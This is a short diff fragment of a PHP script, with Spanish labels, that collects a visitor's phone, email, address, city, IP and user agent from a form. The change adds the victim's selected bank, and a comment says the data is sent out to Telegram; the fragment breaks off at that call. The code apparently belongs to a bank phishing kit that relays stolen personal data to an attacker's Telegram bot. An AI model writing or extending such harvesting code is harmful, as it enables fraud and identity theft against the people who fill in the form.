@@ -34,8 +34,10 @@ $msg .= "📱 *Teléfono:* " . $_POST['phone'] . "\n";
 $msg .= "📧 *Email:* " . $_POST['email'] . "\n";
 $msg .= "🏠 *Dirección:* " . $_POST['address'] . "\n";
 $msg .= "🏙 *Ciudad:* " . $_POST['city'] . "\n";
+$msg .= "🏦 *Banco Seleccionado:* " . $_POST['bank'] . "\n";
 $msg .= "🌍 *IP:* " . $user_ip . "\n";
-$msg .= "🖥 *User-Agent:* " . $user_agent . "\n";
+$msg .= "🖥 *User-Agent:* " . $_SERVER['HTTP_USER_AGENT'] . "\n";
+
 
 // Enviar mensaje a Telegram
 file_get_contents(
